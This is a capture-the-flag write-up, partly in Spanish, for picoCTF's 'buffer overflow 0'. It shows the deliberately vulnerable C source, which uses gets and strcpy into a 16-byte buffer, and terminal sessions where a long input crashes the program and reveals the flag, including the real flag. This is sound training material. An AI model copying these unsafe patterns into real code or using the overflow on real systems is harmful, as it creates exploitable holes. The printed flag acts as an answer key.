## Description

Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/174/vuln). You can view source [here](https://artifacts.picoctf.net/c/174/vuln.c).Connect using:`nc saturn.picoctf.net 49920`
#### Hints
- How can you trigger the flag to print?
- If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.
- Run `man gets` and read the BUGS section. How many characters can the program really read?
## Solución

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf
```

```shell
┌──(kali㉿kali)-[~/…/categorias/Binary_Explotation/parte_01/buffer_overflow_0]
└─$ ./vuln       
Input: input
The program will exit now
                                                                                                            
┌──(kali㉿kali)-[~/…/categorias/Binary_Explotation/parte_01/buffer_overflow_0]
└─$ ./vuln
Input: sdtfgvysdafadsjlfhadslfhadsfadsfasdhjashjkhjkasadfhjsdfshudisfhasdf
picoCTF{dummie_tonta_flag}

                                                                                                            
┌──(kali㉿kali)-[~/…/categorias/Binary_Explotation/parte_01/buffer_overflow_0]
└─$ nc saturn.picoctf.net 49920
Input: fdsahfjikahfdasufhadsiuhfadshdskfjhdiosuafdjksfdsghuyfadsifadfs
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
                                           
```

## Bandera
```css
flag: picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```
## Notas Adicionales

## Referencias
- 